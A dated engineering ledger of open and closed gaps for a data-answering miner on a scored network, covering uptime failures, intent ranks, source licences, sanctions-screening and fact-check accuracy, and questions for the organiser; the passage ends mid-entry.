# GAPS.md — honesty ledger

## 2026-11-07 ~03:05 UTC (08:35 IST) uptime alarm — G280

- **G280 — The 23:29 UTC uptime run failed (issue #19) on two routes this branch deleted. `CLOSED 2026-11-07 03:32 UTC`:
  PR #18 merged as `aad95d2`; dispatched run 42334338259 on `main` found 34/34 up, and the workflow closed #19.** Its result: 37 of 39 routes up; `/keywords` and `/vuln-triage` returned 404. Both routes were removed
  on purpose in `6aebe0f`, which went live inside `bee3f6a`, and neither is in registration 4829.
  The workflow checks out `main` and sweeps `main`'s `miner.yaml`, which is 41 commits behind production. The
  same sweep using this branch's YAML (`628ca5c`) found 34 of 34 up at 03:00 UTC. Every scheduled run will fail
  until `main` carries the current YAML.
  Also checked at 03:00 UTC:
  - The SHA-256 of `miner.yaml` at `628ca5c`, read from raw.githubusercontent, is `0xdb6e08…649a`, the same
    hash recorded for signing.
  - All 35 ids are canonical in `/engine/v1/intents`.
  - On-chain `isCanonicalIntent` is still unchecked.

## 2026-11-07 ~02:50 UTC (08:20 IST) N1 YAML on V2 ids — G270 fixed; G279 recovered

- **G270 — FIXED IN THE YAML (`5bef2be`), validation pending.** Every endpoint and `supported_intents` entry is
  the node's one canonical child of its family (`/engine/v1/intents`, 136 ids, all 35 `canonical_on_chain`, read
  2026-11-07 ~02:40 UTC): 28 `_GENERAL`, plus SSL_VERIFICATION_CERT, WEATHER_CHECK_TEMPERATURE, CVE_LOOKUP_CVSS,
  CURRENCY_EXCHANGE_CONVERT, CRYPTO_PRICE_USD, URL_SCAN_VERDICT. `tools/manifest.mjs` folds ids to families for the
  tools; `manifest-diff.mjs` compares by family and fails on a bare family. Checks: unit 914/914, manifest diff
  PASS, intent answers 39/39 against production (02:45 UTC). Not checked: `isCanonicalIntent` on chain (no `cast`
  here) and the Anjoman validator, which is the owner's session.
- **G279 — recovered.** The fed-funds check passed in the 02:45 UTC run.

## 2026-11-06 ~22:55 UTC (Nov 7 04:25 IST) quality release `bee3f6a` — G276, G277, G252, G251, G214 acted on; G278–G279 new

Release record: `track1-miner/docs/evidence/release-2026-11-06-quality-fixes/`. Added-intents audit:
`track1-miner/docs/evidence/n1-added-intents-audit-2026-11-06/results.md`.

- **G276 — DEPLOYED.** A FINANCIAL_DATA figure it cannot give is named in the first sentence with the reason; a
  product's sales question says filings cover the whole company before giving company revenue (G200, partly).
- **G277 — CLOSED for DNS and token supply: 10/10 against sources** (Cloudflare DoH, `eth_call totalSupply`),
  production 2026-11-06 ~22:57 UTC. Keyword extraction and vulnerability triage left the draft (`6aebe0f`).
  ONCHAIN_METRIC_VERIFY has one sourced read (block 21000000 gas = Blockscout 13,952,884); audit it before signing.
- **G252, G251 — DEPLOYED.** Counted goods and tonnes are quantities; outage messages no longer echo the question.
- **G214 — fixed in code, then dropped with the route.** The verb filter was merged away when Codex deleted
  `keywords.ts`; recoverable from `044d8fb` if the intent returns.
- **G278 — EVENT_OUTCOME scores near zero because the scorer's questions are results, not markets. `OPEN, measuring`.**
  Epochs 1959–2028: ours 0.001–0.05, third place 0.07–0.44; ranks 1–2 are F1 (Jolpica) and Bundesliga (OpenLigaDB)
  results feeds. `bee3f6a` adds a Wikidata winner fallback for finished events. Read the score after three epochs.
  Unknown: whether the scorer's questions are who-won questions at all. "Did X happen?" is still market-only.
- **G279 — The New York Fed API failed with a redirect to `/errors/500` at 22:55 UTC. `OPEN, upstream`.** The
  fed-funds answer reports the publisher unavailable (honest). If it persists, add a second source for the target
  range (Federal Reserve Board H.15).
- **Topic classification with no labels stays refused.** A default label set mislabelled "NASA confirms water ice on
  the Moon" as environment on a preview, so it was withdrawn before production.

## 2026-11-06 ~22:10 UTC (Nov 7 03:40 IST) N1 intent picks — G269–G274; `/onchain-metric` built (`6aebe0f`), not deployed

Evidence: `track1-miner/docs/evidence/n1-new-intents-2026-11-07/`.

- **G269 — ONCHAIN_METRIC_VERIFY's ranks 1–3 answer a block-gas question wrongly. `OPEN`.** Asked "How much gas did
  block 21000000 on ethereum use?" (Blockscout: 13,952,884), the 0.997, 0.977 and 0.927 endpoints did not return
  it; the one correct endpoint of 28 ranks 9th at 0.399 (epoch 2028). Same shape as G265. A correct answer may not
  rank. One question only.
- **G270 — The N1 YAML names families V1-style. `OPEN`, blocks validation.** `miner.yaml` lists
  `ONCHAIN_METRIC_VERIFY`, `DNS_RECORD_LOOKUP`, …; V2 registers listed intents (`…_GENERAL`, `CVE_LOOKUP_CVSS`).
  `tools/manifest.mjs`, `intent-answers.mjs` and the manifest tests key on the V1 names, so the rename touches them
  too. Whether the validator still maps V1 names was not tested.
- **G271 — Old on-chain state comes from one provider. `OPEN`, stated in every answer.** On 2026-11-07 at block
  21000000: publicnode "Archive requests require a personal token", flashbots "state … is pruned", merkle rate
  limited; only drpc answered. Receipts and blocks still read from two.
- **G272 — WEATHER_FORECAST_VERIFY has no licence-clean global rain source found. `OPEN`.** NOAA NCEI global-hourly
  returned no rows for Lisbon for 2026-11-04 to 06; METARs outside the US carry no rain amounts. Not built.
- **G273 — FX_NOW asks for a live mid-market rate; we have ECB's daily one. `CLOSED, not added`.** The leader serves
  the same ECB rate and the top six tie at 0.880 (EUR). Reopen only with a licensed live source.
- **G274 — ACADEMIC_SEARCH fell from 0.8762 (epoch 2026) to 0.6358 (epoch 2028), rank 12 of 17. `OPEN`.** Cause
  not investigated. `192aecc` changed only sanctions files; `7301474` and the eval questions are the suspects.

## 2026-11-06 ~22:10 UTC (Nov 7 IST) N1 cut prepared — G275–G277; G250 fixed in the pending YAML

Ahmed (DM, 2026-11-06): registering intents "without actually supporting their functionality won't help". Pending
manifest and checks: `track1-miner/docs/evidence/n1-cut-2026-11-06/`. Not signed.

- **G275 — Licences of what stays claimed. `OPEN, owner decision`.** CRYPTO_PRICE reads Bitstamp, whose commercial
  redistribution needs a signed Data License Agreement we do not have (`sources.ts`: `conditional`, met `no`). That
  is the same class of problem as the four intents cut. Sign the agreement, find a licensed price source, or cut
  CRYPTO_PRICE in the same update.
- **G276 — FINANCIAL_DATA answers SEC 10-K figures only, and drops what it cannot answer. `OPEN`.** "Apple's
  revenue and P/E" returned revenue and said nothing about the P/E (production, 2026-11-06 ~22:05 UTC). An answer
  should name each requested figure it could not give. The description now claims filings only.
- **G277 — The four added intents have smoke probes, not a sourced audit. `OPEN, before signing`.** DNS matched
  Cloudflare DoH; token supply, MX and the KEV dates were not checked against a source; keyword phrases cross
  word boundaries (G214).
- **G250 — FIXED IN THE PENDING YAML.** WEB_SEARCH now leads with a question it answers and no longer claims Google
  News. It takes effect when the update is signed.
- **EVENT_OUTCOME is not cut.** TASKS N1 proposed cutting it on its devnode score (0.0289, rank 12). The audit
  replay has it 4 of 4 (1 re-checked pass, 3 carried), and G248 shows a devnode score does not measure correctness.
  Find why it scores low (scored field?) before cutting.

## 2026-11-06 ~16:50 UTC intent push by earnings — G265–G268; non-SDN list deployed (`192aecc`)

Evidence: `track1-miner/docs/evidence/intent-ranks-2026-11-06/` (ranks at epoch 2026, 12:40 UTC, before the
`7301474` release) and `track1-miner/docs/evidence/release-2026-11-06-ofac-nonsdn/`.

- **G265 — The sanctions scorer ranks a constant non-answer above a real screen. `OPEN, owner reports`.**
  Epoch 2026: `san-os-au` 0.9997 (rank 2) and `san-os-ofac` 0.9987 (rank 3) take no input
  (`input_schema.properties {}`) and return OpenSanctions dataset metadata (4.3 KB, the same for every question).
  LiveCert screens the named party and was rank 8 at 0.9827. No champion evaluator exists for the family, so the
  scorer is presumably the generic foundation reward model (not confirmed from docs). Same direction as G248.
  Unknown: what the node actually sends and receives; how many of the 387 ranking questions this covers.
  Draft for Ahmed (owner sends, organiser only): "SANCTIONS_SCREENING_MATCH_GENERAL, epoch 2026: ranks 2 and 3
  (san-os-au 0.9997, san-os-ofac 0.9987) have an empty input schema and call OpenSanctions'
  `/datasets/latest/<dataset>/index.json`, which returns the same 4 KB of dataset metadata for every question.
  No name is screened. LiveCert screens the named party against OFAC and UN and is rank 8 at 0.9827. The family
  has no champion evaluator. Is this the generic scorer, and is a fix planned?"
- **G266 — CORPORATE_REGISTRY: seven miners tie at 1.0000; we are listed 7th. `OPEN`.** What orders a tie
  (registration time, latency, stake) is unknown; it is one of the questions sent to Ahmed 2026-11-04.
- **G267 — WEB_SEARCH_GENERAL and NEWS_SEARCH_GENERAL have no scored miner at all (0 of 25, 0 of 18).
  `OPEN`.** How Telegraph routes an unscored intent is unknown, so quality work there cannot be measured by rank.
- **G268 — Production cleared parties on OFAC's non-SDN list. `DEPLOYED 2026-11-06 ~16:45 UTC as 192aecc`.**
  "Mohammed Abu Tair" (ABU TEIR, NS-PLC, ref 9640) → `no_match` on production at ~16:15 UTC; `match` on the
  `192aecc` production deployment at 16:49 UTC. EU and UK lists remain unscreened, as answers say (TASKS P1c).
- Correction, same session: the advertised `/query` URLs of the `0xbd6f6960` miners 404, but the node calls each
  YAML's `external_path`, and most of those pass the question to a real search API. Only the two `san-os-*`
  entries are confirmed constant. `gas-publicnode-rpc` (GET `/`, no input) is unverified.

## 2026-11-06 ~16:20 UTC scored-fields release — G263 acted on; G249 confirmed; G218 re-checked; G264 new

Evidence: `track1-miner/docs/evidence/scored-fields-2026-11-05/` (the audit) and
`track1-miner/docs/evidence/release-2026-11-06-scored-fields-all/` (the release, `7301474`, preflight 7/7).

- **Eleven intents' answers lacked their scored field. `DEPLOYED 2026-11-06 ~16:09 UTC, measuring`.** The audit of
  all 36 intents against `GET /engine/v1/intents/<id>` found the G254 gap again in SSL, gas, currency conversion,
  token holders, crypto price, on-chain lookup, wallet balance, event outcome, URL scan, URL reputation and
  current temperature. Each answer now carries the field under the intent's name, copied from the route's own
  value. FRAUD_DETECTION `risk_score` and FINANCIAL_DATA `market_cap_usd` are left out on purpose. Read the
  epochs after 16:09 UTC against the release's `epochs-before.json`.
- **G263 — acted on: `filing_count` counts every form.** zk-filing's public endpoint and ours both give Apple 89
  (2026-11-05) and 91 (2026-11-06) filings for the last 12 months. Filings stayed at 0.815–0.906 over four epochs
  after the null-count release; the next epochs test the all-forms count. Still `OPEN, measuring`.
- **WEATHER_CHECK_TEMPERATURE — plain temperature questions get the current reading.** "What is the temperature in
  X?" used to get a 24-hour range. Scores were 0.56–0.68 over the last four epochs.
- **G249 — CONFIRMED: the miner's Vercel team is on Hobby.** `vercel api /v2/teams/<id>` on 2026-11-06 ~16:20 UTC:
  team `wukong4`, `billing.plan: "hobby"`, `status: "active"`. Vercel's fair-use page (read 2026-11-04) bars
  commercial use on Hobby, and the miner sells answers through Telegraph. **DECIDED 2026-11-06, owner: stay on
  Hobby** ("i dont have money to pay … miner is hackathon thing as of now. we can change paid when they shift
  telegraph to mainnet"). Every payment so far is testnet USDC on Sepolia, so the miner earns no real money.
  Revisit when Telegraph moves to mainnet. Moving host changes `base_url`, which needs `updateMiner`.
- **G218 — re-checked 2026-11-06 ~16:25 UTC: still unpublished.** The rules page still says payout is "governed by
  the official prize-payment terms" and links none; `anjoman.ai/terms` (updated 2026-11-02) has no prize terms.
  Whether India is eligible is unknown. `OPEN, ask the organiser`.
- **G264 — CRYPTO_PRICE_USD has not scored us since epoch 2021. `OPEN`.** We were 10th at 0.973 (2021,
  2026-11-05 17:55 UTC); epochs 2022, 2024 and 2026 have no row for us while 46–48 miners are scored. Cause not
  read. `price_usd` is now named in the answer (this release).

## 2026-11-05 ~19:20 UTC filings release — G257 deployed; G263 measuring

Evidence: `track1-miner/docs/evidence/release-2026-11-05-filings-issuer/`.

- **G257 — DEPLOYED 2026-11-05 ~19:10 UTC (`9b82d08`, `miner-f28bzjwiw`), preflight 7/7.** Production now finds the
  issuer in "How many filings did Apple make in the last 12 months?" (13) and reads `entity=Tesla&period=last 12
  months` (15); before this release both answered "No issuer was named". `CLOSED` for the cases probed.
- **G263 — the null counts are live. `OPEN, measuring`.** An issuer not in EDGAR and a question with no period now
  send `filing_count: null`. No filings epoch was scored after 2019 by ~19:18 UTC; read the next ones against
  0.8145 (2019) and 0.976–0.980 (before `filing_count` existed). The form and source questions stay open.
  - **Epoch 2021, scored 19:50 UTC, after this release:** 10th, **0.8749**. The field recovered from 2019: third
    place 0.9975 (zk-filing, which counts every SEC form), and miners that cannot count filings at all score
    0.974–0.976 (reg-fedreg-agencies, reg-eurostat). Two epochs with our count (0.8145, 0.8749) against five
    without it (0.976–0.980): our `filing_count` now most likely disagrees with the reference. Next: count every
    form, as zk-filing does, or send no count; decide on one more epoch (`/api/miners`, read 21:05 UTC).

## 2026-11-05 ~18:20 UTC first epoch after the scored-fields release — G254 read; G257 fixed in code; G263 new

Evidence: `track1-miner/docs/evidence/release-2026-11-05-scored-fields/` (`epochs-after-2019.json`,
`filings-field-2015-2019.json`) and `track1-miner/docs/evidence/filings-issuer-2026-11-05/local-probes.txt`.

- **G254 — epoch 2019 (the only one scored after the deploy, by 18:13 UTC).** Sanctions 12th, 0.997 (inside
  3rd–12th); registry **3rd, 0.9979**, tied with third place and its best score (before: 0.942–0.992); filings
  **11th, 0.8145**, far below its 0.976–0.980 range. The whole filings field fell that epoch (txlens 0.9998 →
  0.9953, zk-filing 0.9949 → 0.9839, chainsight-oracle 0.960 → 0.737, reg-sec-edgar 0.816 → 0.620), so the
  scored sample changed. How much of our drop the deploy caused is not known from one epoch. Still `OPEN`.
- **G257 — FIXED IN CODE, NOT DEPLOYED.** The issuer is found in "How many filings did Apple make in the last 12
  months?", "Microsoft 8-K filings in the last 6 months", "filings were made by Nvidia over the past year" and
  "Johnson & Johnson" (local server, live EDGAR). The route also reads the intent's own `entity` and `period`;
  they are not declared in the frozen YAML, so only a caller using the intent's names sends them. Windows now
  include quarters, years and "the past year".
- **G263 — How the filings scorer treats a missing count. `OPEN, guess`.** Miners that by their catalogue
  descriptions cannot count filings score about 0.98 at epoch 2019 (reg-fedreg-agencies 0.9787, "US Federal
  Register agencies list"; reg-eurostat 0.9775, "Eurostat GDP dataset"), while reg-worldbank scores 0.2255 and
  reg-imf 0.1447. Their answers were not read. If a missing count is scored leniently
  and a wrong one is punished, our new explicit counts can lower the score where the reference counts something
  else. Two such cases are changed in code (not deployed): an issuer not in EDGAR now has `filing_count: null`
  (was 0), and a question with no period or fiscal year has `null` (was a count of the whole index, 26–171).
  Two definitions are unconfirmed. **Which forms:** zk-filing, an EDGAR counter that scores above us, counts every
  form by default; we count material forms only. **Which source:** rank 1 is a raw Federal Register search.

## 2026-11-05 ~10:00 UTC (15:30 IST) organiser answers and real paid traffic — G258–G262; G206 closed

Sources: Ahmed's reply (TELEGRAPH_FACTS items 12–17), the live Rules page re-read 2026-11-05, and the Daemon feed plus
signal records for every paid request routed to `livecert` since Nov 1 (`track1-miner/docs/evidence/consumption-2026-11-05/`).

- **G262 — FACT_CHECK gets common-knowledge claims wrong for real paying callers. `DEPLOYED 2026-11-05 ~21:09 UTC`
  (`e501a57`, `miner-mzapr28vo`; preflight 7/7 first run; record
  `track1-miner/docs/evidence/release-2026-11-05-factcheck/`; rollback `miner-f28bzjwiw`).** Record: `track1-miner/docs/evidence/factcheck-real-claims-2026-11-05/`. On the 37 real
  claims: right 7 → 14, wrong 3 → 0. On 31 regression claims (audit, gate and built false claims): right 19 → 17,
  wrong 2 → 0; the three lost were right before only on a sentence that does not address them. Causes:
  two-thirds word overlap read as support; compound claims; a class read off any word near a copula; the lead's "It"
  and "5,895" not read; lists and link sections read as statements; quoted titles taken as the whole claim. Still
  open: 9 of 21 true real claims stay `unverified`; a different year or value is never read as a refutation; the
  fallback `judge()` path is unchanged. The evaluator's labels are unknown; ours are general reference knowledge.
  The original report follows. Of 37 distinct
  claims from wallet `0x1046…508a` (2026-11-03): "Venus is the largest planet in the Solar System" → `supported` 0.7;
  "The Eiffel Tower is located in Berlin and was completed in 1889" → `supported` 0.7; "Mount Kilimanjaro is the
  tallest mountain in Africa at 5895 metres" (true) → `contradicted` 0.7. "Water boils at 90 degrees Celsius at sea
  level" and "BERT was introduced by Meta in 2012" → `unverified`, and so are most true claims (Berlin Wall 1989,
  Golden Gate 1937, Python 3.0 2008). Devnode ranks the intent 5th (0.9791, epoch 2017), so the rank hides this.
  Four missions buy FACT_CHECK. Cause not yet read in the code.
- **G258 — Sanctions screening misses listed entities written the way people write them. `DEPLOYED 2026-11-05
  ~18:28 UTC` (`4fb477e`, `miner-mztwjxnqa`; record `track1-miner/docs/evidence/release-2026-11-05-sanctions-names/`;
  rollback `miner-5arlzhkv6`).** Fix and replay: `track1-miner/docs/evidence/sanctions-real-inputs-2026-11-05/` (on
  the 180 real inputs, unknown 7 → 0, match 85 → 107, three false positives gone; unit 885/885). Not yet known:
  whether the sanctions rank moves (read three epochs after 18:28 UTC). Still open: a name mixing Arabic or Chinese script with Latin words is
  screened on its Latin words only. From
  wallet `0x66fB…4a83` (287 requests, 175 distinct names, 2026-11-01/02), and from others:
  - Cyrillic names are not read as names: "Сбербанк", "Гарантекс", "Тинькофф Банк" → `unknown`, "No person,
    company or wallet was named", so nothing was screened.
  - Abbreviated or reworded forms miss: "AEZA Grp", "Lazarus Grp.", "Hydra Mkt", "PAO Sberbank Rossii",
    "Suex dot io", "suex.io", "Blender dot io", "Cryptex Platform", "Grinex Exchange" → `no_match`. "Gr1nex",
    "L4zarus Group" and "garanteks" do reach `possible_match`.
  - One false positive: "Atlassian" → `possible_match` with ATLAS.
  - Correct: listed entities written as listed, the clean companies, and Tornado Cash (`no_match`; OFAC delisted it
    in March 2025, not re-checked today).
  Five missions buy this intent. Each "should match" above was confirmed against the live SDN list on 2026-11-05
  (the closest listed name is the party named); these are still someone else's benchmark, not reference labels.
- **G259 — Paid traffic exists, but none of it is yet tied to a registered H2 mission app. `OPEN, owner + Ahmed`.**
  385 `source: user` requests reached `livecert` from Nov 1 to Nov 4, from 16 wallets; 13 of them were ranked-routed,
  from 5 wallets. None of the wallets appears in this repo or on `codex/sanctions-benchmark-v7`. That does not prove
  independence: the owner's Anjoman smart wallet, the owner's second entry or a Codex run would also be unknown
  here. Consumption points need "a qualifying H2 mission app", so each wallet must be tied to a registered H2 App
  before it is claimed. Until then, report the requests only as network-recorded paid use, of unknown origin.
- **G260 — SENTIMENT_ANALYSIS_GENERAL is unscored for us while 14 other miners are scored. `OPEN`.** So it is not
  missing evaluation coverage (Ahmed's point 2) but something about our answers or our sampling. Not investigated.
- **G261 — The registration guide still describes a 7-day grace period. `OPEN, docs vs organiser`.** "Step 7: The
  grace period" (updated 2026-11-01) against Ahmed's "There is no seven-day grace period for a new or updated
  Miner" (2026-11-05). We plan on the organiser's statement. If routed share after an update looks throttled, this
  is the first suspect.
- **G206 closed 2026-11-05** by the organiser: no grace period on update (TELEGRAPH_FACTS item 12).
- **Renumbered on merge:** these entries were first written as G254–G258, numbers the parallel 2026-11-04 block
  below had already used; they are G258–G262 everywhere; the fact-check entry became G262
  when the scored-fields release (below) took G257.

## 2026-11-05 ~10:00 UTC scored-fields release — G254 deployed; G257 new

Evidence: `track1-miner/docs/evidence/release-2026-11-05-scored-fields/`.

- **G254 — DEPLOYED 2026-11-05 ~09:39 UTC (`3c5e8ff`, `miner-5arlzhkv6`), `OPEN, measuring`.** Production
  answers carry `matched`, `active` and `filing_count` (probes 09:52 UTC). The baseline is every epoch scored
  before the deploy (`epochs-before.json`): sanctions 3rd–12th over 21 epochs, so one epoch says nothing;
  registry 4, 3, 4; filings 8th–10th with a steady ~0.02 gap to third place. Read again once three epochs scored
  after 09:40 UTC exist, with `tools/epoch-history.mjs`. A move inside those ranges is not an effect.
- **G257 — The filings route finds no issuer in a question alone. `FIXED IN CODE 2026-11-05, see above`.** "How many filings did Apple make in
  the last 12 months?" and "Microsoft 8-K filings in the last 6 months" without `company` answer "No issuer was
  named" on production before this release and on its preview; "Has Apple filed a 10-K this year?" and "Latest
  SEC filings for Tesla" do find the issuer (preview). If the node sends only `query` for REGULATORY_FILING_MONITOR, these questions
  score as misses. Whether it fills our declared `company` param is not known.
- **G231 — seen again.** Preflight's first run failed `/papers` (1–2 papers) and RESEARCH_SYNTHESIS; both passed
  a minute later. The `paperfraud` live test fails from this machine because OpenAlex is unreadable on the keyless
  per-IP budget. Production still sets no `OPENALEX_*` variable (`vercel env ls production`, 2026-11-05).

## 2026-11-04 ~21:00 UTC sanctions, registry and filings intents — G235 superseded; G254–G256

Evidence: `track1-miner/docs/evidence/intents-2026-11-04/`. Facts: docs/TELEGRAPH_FACTS.md, top section.

- **G235 — SUPERSEDED: scoring is live.** 1,938 of 1,986 registrations are `scored: true` at epoch 2013
  (2026-11-04 ~20:38 UTC); 4829 carries 34 intent scores. Ranks below; the rest of 4829's ranks were not read.
- **G254 — Our three compliance answers lacked the intents' scored field names. `DEPLOYED 2026-11-05, see above`.**
  SANCTIONS_SCREENING_MATCH_GENERAL scores `matched` (we sent `verdict`), CORPORATE_REGISTRY_LOOKUP_GENERAL
  scores `active` (we sent `entity_status`), REGULATORY_FILING_MONITOR_GENERAL scores `filing_count` (we sent no
  count at all). 4829 has no `intent_mapping`, so the node's parser model has to find each value. The answers
  now carry the intent's own fields as well; unit 875/875, local probes in the evidence folder.
  - **Ranks before the change (epoch 2013):** sanctions 11th (0.9981; 1st 1.0), registry 4th (0.9423; 3rd 0.9683),
    filings 8th (0.9781; 3rd 0.998). Routed demand goes to the top three only (70/20/10), so all three earn us
    no routed requests today.
  - **Not known:** whether naming the fields moves the score. The reference is the median of up to 3 truth
    sources, and the pools are not public (`/api/evalpool/submissions` without a submitter answers 405).
  - **Assumptions:** a `possible_match` counts as `matched: true` (the intent includes near-matches on spelling);
    `filing_count` counts the form asked, else material forms only (10-K, 10-Q, 8-K, 20-F, 6-K, 40-F, DEF 14A,
    S-1, S-4, F-1, 10-KT), never Form 4s. If the reference counts every form, our count is low. The period
    reaches us only through `query`: the endpoint declares no `period` param, and adding one needs `updateMiner`.
  - **Measure after deploy:** the three ranks and scores for 3 epochs, against the full pre-deploy history
    (epochs arrive every 2–6 hours, not every hour).
- **G255 — One wallet holds 1,673 of 1,986 registrations, and the top routed slots in two of these intents.
  `OPEN, question for Telegraph`.** Wallet `0xbd6f696096cceeaff7406d802ba04500eeaf6976`, registered
  2026-10-24 23:27 – 2026-11-02 06:06 UTC, covers all 136 intents with one-intent miners whose `base_url` is a
  raw public source (data.opensanctions.org, federalregister.gov, api.gleif.org, treasury.gov). They hold
  registry ranks 1–3 (an OFAC sanctions index ranks 1st as a company register) and filings rank 1. That wallet
  has no evaluation rows in either intent (`/submissions/mine`, 0 rows), so "they score themselves" is **not**
  supported. Whether these are Telegraph's own reference miners, and whether they take routed traffic, is
  unknown. Ask before spending effort to outrank them.
- **G256 — "These intents get many requests" is not checked. `OPEN`.** No public endpoint gives requests per
  intent: `/api/miners` has `total_requests_served` per registration only (4829: 383; TxLens 413). The owner saw
  the figure somewhere not named; a screenshot or the page would let it be recorded here.
  - **Partly answered 2026-11-05 for our own miner:** the Daemon feed names the miner and intent of every paid
    request. Nov 1–4: 385 to `livecert`, 306 of them sanctions screening (G259, `consumption-2026-11-05/`). The same
    tool run with another slug gives that miner's count; across intents it has not been run.

## 2026-11-04 ~21:30 UTC (Nov 5 03:00 IST) winning push — G248–G253

- **G248 — Devnode ranks STOCK_PRICE_US_EQUITY 1st (0.9987, epoch 2013) while every stock request is refused
  `not_licensed`. `OPEN`.** So a devnode rank does not prove a correct answer, and routed stock buyers reach a
  miner that refuses them. Remove STOCK_PRICE at the next `updateMiner`; never cite that rank. Evidence:
  `track1-miner/docs/evidence/audit-replay-2026-11-04/` rows 101–104 and the catalog read of epoch 2013.
- **G249 — Which Vercel plan serves the miner? `OPEN, owner checks the dashboard`.** Vercel's fair-use page
  (read 2026-11-04) says "Hobby teams are restricted to non-commercial personal use only" and commercial use needs
  Pro. The miner sells answers through Telegraph. The CLI and the Vercel MCP did not return the plan.
- **G250 — WEB_SEARCH's first manifest example is a news question, which is refused (G194). `OPEN, next
  updateMiner`.** Lead the description with a question it answers ("Who is the CEO of OpenAI?").
- **G251 — Weather failures name the whole question as the place. `OPEN, wording`.** "A storm risk forecast for
  Is there a storm risk in Miami…" (audit replay rows 7, 15; both fine when asked again minutes later). The two
  fast failures (~760 ms) were not traced to an upstream.
- **G252 — Extraction does not read "1,200 units" as a quantity. `OPEN`.** Row 30 now names the date, the
  amount and the organisations, not the unit count.
- **G253 — The capacity figure covers one route. `OPEN, by design`.** 58 req/s at 20 callers on `/ssl-check`
  with no errors; LLM routes are bounded by the Groq free tier and were not load-tested
  (`track1-miner/docs/evidence/capacity-2026-11-04/`).
- **G205 — CLOSED 2026-11-04.** The `uptime` workflow sweeps every endpoint every 30 minutes from main
  (`3d354e6`); `tools/availability-report.mjs` turns the artifacts into the reliability table.

## 2026-11-05 IST evaluator activation

- **URL_SCAN_VERDICT preflight. `OPEN`.** Sepolia confirmed `URL_SCAN` is the hybrid prefix on Nov 7 IST.
  The epoch 2030 leaderboard listed eight miners, and routing resolves to `GENERIC`. The public pool
  counts do not identify the hybrid reference material. The generic judgment component scored 8/16 on
  controlled pairs. A challenger, fused scores and workflow improvement still need verification.
  See [the replay evidence](track2/adapter/url_scan/README.md).

## 2026-11-01 evaluation material — G247

- **G247 — Translation material: three things only the upload can confirm. `OPEN`.** (1) The node's 85%
  near-duplicate measure is unpublished; `check-rows.mjs` fails at 80% on edit distance (worst pair 72.8%).
  (2) `source_kind: "dataset"` with a Tatoeba link should make rows `attested` per the docs; unconfirmed until
  the rows are read back. (3) Whether a "near-miss" is worse was judged by reading the English of both
  sentences, not by a measured scorer; 6 of 150 were dropped as too close. The material's ability to separate
  good from bad answers is not yet measured (rubric: 40 points); the next step is scoring it with a baseline.

## 2026-10-31 ~18:40 UTC docs and devnode re-check — G237 killed; G235 revised; G238–G240 new

Facts and sources: docs/TELEGRAPH_FACTS.md, top section.

- **G237 — KILLED.** A registered comparator is not what makes a deterministic family scored: FX_NOW_EUR is scored
  at epoch 1945 with every FX_NOW comparator deregistered since 2026-10-28, and the docs say there is "no
  'better' comparator to build". The CRYPTO_PRICE comparator registration (`track2/SIGN_S2.md`) is withdrawn:
  it would spend a $5 bond and owner time for no scoring change. The endpoint stays up; it costs nothing.
- **G235 — revised cause. `OPEN, network-side`.** No miner is ranked in our 36 intents because:
  - **29 judgment and 2 hybrid intents:** none has a canonical adapter, and the pool needs 5 contributors before
    questions are used. Ours have 0–1, except URL_SCAN_VERDICT (5, but no adapter, `routed: false`).
  - **CRYPTO_PRICE_USD** (and probably CURRENCY_EXCHANGE_CONVERT and STOCK_PRICE_US_EQUITY, which carried the
    same note on 2026-10-31): the intent reads `onchain.ready: false`, "price_usd has no decimals". This is the
    likely blocker; it is an inference, and only Telegraph can fix the intent.
  - **WEATHER_CHECK_TEMPERATURE:** `ready: true`, one ranking-half truth source, unscored. **Cause unknown.**
  - **SSL_VERIFICATION_CERT:** no truth source at all.
  - Nothing in the miner changes any of this. The owner's question to Telegraph (TASKS) is rewritten to ask these.
- **G238 — Our LLM_OUTPUT_EVALUATION adapter is in a refused format. `OPEN, Track 2`.** The 1.2 GB full-model
  `.wasm` is `legacy_full_model`. The PEFT checkpoints exist (`C:\Users\hyada\tg-eval\runs\LLM_OUTPUT_EVALUATION*\adapter\`),
  so re-export needs no retraining. Blocked on what the docs call "to be announced": the published
  `foundation.json` and a reference executor that matches the node bit for bit. The family now has an incumbent
  (seed 900002), which a new adapter must beat by the replacement margin. Also unchecked: whether the shared
  Foundation Model is the ModernBERT G32 found the node running.
- **G239 — Epochs went from 5 minutes to 1 hour between 15:39 and 18:35 UTC on 2026-10-31.** Whether this stays
  for H2 is unknown. Scoring and routing now update hourly.
- **G240 — Does the integrate.telegraphprotocol.com "easy way" pay the module bond or only the gas? `OPEN`.** Only
  matters if we register a module.
- **G236 still open:** `cast` is not installed on this machine, so the Diamond check was not run.

## 2026-10-31 ~18:55 UTC first mission-workflow fixtures — G241–G243

`track1-miner/tools/mission-fixtures.mjs` on production (`330f2af`): 3 of the 9 fully-served workflows pass, 4
fail, 2 unchecked (SEC needs a contact user agent). Evidence: `track1-miner/docs/evidence/missions-2026-10-31/`.

- **G241 — Fact-check leaves settled facts `unverified`. `FIXED, deployed 2026-10-31 (`a8abbcf`)`.** Two causes: a possessive subject ("The bank's headquarters have been in London") was always rejected, and a disambiguation page ("Stripe") was read instead of the company. Fixed in `factrelation.ts` (possessive allowed only before the claim's own key), `factarticle.ts` (next candidates after a disambiguation page, support only) and `foundingSentence()`. "The Bank of England is
  headquartered in London" and "Stripe was founded in 2010" both return "does not settle it either way". "The
  Eiffel Tower is located in Paris" passes. FACT_CHECK is bought by 14 builds.
- **G242 — Sentiment misses finance language. `FIXED, deployed 2026-10-31 (`a8abbcf`)`.** Two causes: no market words in the lexicon (now scored only beside their market noun), and the model prompt called outcome news "a statement of fact" (now outcome news is positive or negative). "beat earnings expectations and raised guidance; shares
  jumped 8%" → `neutral`. Lexicon-based (`sentiment-lexicon.ts`).
- **G243 — Event outcome misses a phrasing of a settled market. `FIXED, deployed 2026-10-31 (`a8abbcf`)`.** "United States" vs Polymarket's "US": `foldCountries()` folds both sides. "Who won the 2024 United States
  presidential election?" → `no_market_found`; Polymarket has a resolved market. Polymarket is unreachable from
  this machine (connect fails), so the search can be tested only through a deployment.
- **G244 — TEXT_CLASSIFICATION misses its model deadline about 1 call in 10. `FIXED, deployed 2026-11-01 (`e63df93`, `miner-jyh9t9upq`)`; owner chose "Answer ambiguous".** With a model key set and no model reading, the word list labels alone only at margin ≥ 3; below that the answer is `ambiguous` (drone report: margin 1.6 → ambiguous). No key: unchanged. Previews have no key, so only production can show it. The
  model has 350 ms (G209: the site target is under 400 ms). Today 1 of ~10 production model calls missed it (351 ms);
  the others took 164–247 ms. On a miss the keyless word-association fallback answers, and called a motor failure
